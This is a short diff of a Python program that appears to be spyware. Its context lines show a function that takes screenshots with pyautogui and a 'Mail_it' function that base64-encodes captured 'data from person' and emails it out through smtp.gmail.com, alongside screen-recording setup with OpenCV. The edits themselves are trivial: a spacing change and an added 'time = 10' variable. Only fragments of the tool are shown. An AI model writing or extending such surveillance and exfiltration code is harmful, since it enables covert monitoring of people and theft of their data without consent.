@@ -73,7 +73,7 @@ def Screenshot():
     pics_names.append(name)
     pyautogui.screenshot().save(name + '.png')
 
-def Mail_it(data, pics_names):
+def Mail_it (data, pics_names):
     data = base64.b64encode(data)
     data = 'New data from person(Base64 encoded)\n' + data
     server = smtplib.SMTP('smtp.gmail.com:587')
@@ -129,6 +129,8 @@ filename = "Recording.avi"
 
 #the frame rate of the recording
 fps = 30
+
+time = 10
 
 #VideoWriter creation 
 out = cv2.VideoWriter(filename, codec, fps, resolution)
